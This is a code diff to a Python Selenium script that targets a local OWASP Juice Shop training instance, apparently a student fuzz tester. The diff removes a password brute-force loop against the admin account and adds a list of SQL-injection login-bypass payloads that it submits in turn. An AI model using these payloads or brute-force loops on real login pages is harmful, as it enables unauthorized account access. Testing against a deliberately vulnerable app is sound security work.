@@ -4,6 +4,8 @@ from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.webdriver.common.keys import Keys
 import time
+import requests
+import searchQuery
 
 
 
@@ -13,7 +15,7 @@ def main():
     driver = webdriver.Chrome()  # Use the browser of your choice (e.g., Firefox, Edge)
 
     # Open the webpage
-    driver.get("http://localhost:4/#/")
+    driver.get("http://localhost:3000/#/login")
 
     # Wait for and dismiss the overlay
     try:
@@ -25,56 +27,57 @@ def main():
     except Exception as e:
         print(f"Could not dismiss the overlay: {e}")
 
-    # logInAdminSql(driver)
-    bruteForcePassword(driver)
+    # attempt_sql_injections(driver)
+
     # Close the browser
     input("Press Enter to close the browser...")
     driver.quit()
     exit()
 
-def bruteForcePassword(driver):
-        # Attempt to log in
-    try:
 
-        acctBtn = WebDriverWait(driver, 10).until(
-            EC.presence_of_element_located((By.ID, "navbarAccount"))
-        )
-        acctBtn.click()
+def attempt_sql_injections(driver):
+    # Note: This is very basic.
+    # I was thinking we coud incorporate sql map for this portion of the fuzz tester
+    
+    sql_payloads = [
+        "' OR '1'='1",
+        "' OR '1'='1' --",
+        "' OR ''='",
+        "' OR 1=1#",
+        "' OR 'a'='a",
+        "' OR 1=1/*",
+        "' OR 1=1--",
+        "' OR 1=1;--",
+        "' OR 1=1 OR ''='"
+        "' OR 1=1 --",
+    ]
 
-        logInBtn = WebDriverWait(driver, 10).until(
-            EC.element_to_be_clickable((By.ID, "navbarLoginButton"))
-        )
-        logInBtn.click()
-    except Exception as e:
-        print(f"Could not click log in buttons: {e}")
+    for payload in sql_payloads:
+        try:
+            emailField = WebDriverWait(driver, 10).until(
+                EC.presence_of_element_located((By.ID, "email"))
+            )
+            emailField.send_keys(payload)
+            passwordField = WebDriverWait(driver, 10).until(
+                EC.presence_of_element_located((By.ID, "password"))
+            )
+            passwordField.send_keys("password")
+            passwordField.send_keys(Keys.RETURN)
 
-    emailField = WebDriverWait(driver, 10).until(
-        EC.presence_of_element_located((By.ID, "email"))
-    )
-    emailField.send_keys("admin@juice-sh.op")
-    # Open file and test each password
-    with open("genericPasswords.txt") as f:
-        for password in f:
-            try:
-                print(f"Trying password: {password}")
-                passwordField = WebDriverWait(driver, 10).until(
-                    EC.presence_of_element_located((By.ID, "password"))
-                )
-                passwordField.clear()
-                passwordField.send_keys(password)
-                passwordField.send_keys(Keys.RETURN)
-            except Exception as e:
-                print(f"Could not enter text: {e}")
+            # Wait to see if login was successful
+            time.sleep(1)
 
-            # Check if the login was successful
-            try:
-                invalidDiv = WebDriverWait(driver, 10).until(
-                    EC.presence_of_element_located((By.CLASS_NAME, "error.ng-star-inserted"))
-                )
-            except Exception as e:
-                print(f"Could not find invalid text: {e}")
+            # Check if login was successful
+            if "admin" in driver.page_source.lower():
+                print(f"SQL Injection successful with payload: {payload}")
+                return True
+            else:
+                print(f"SQL Injection failed with payload: {payload}")
 
+        except Exception as e:
+            print(f"Error with payload {payload}: {e}")
 
+    return False
 def logInAdminSql(driver):
     
 
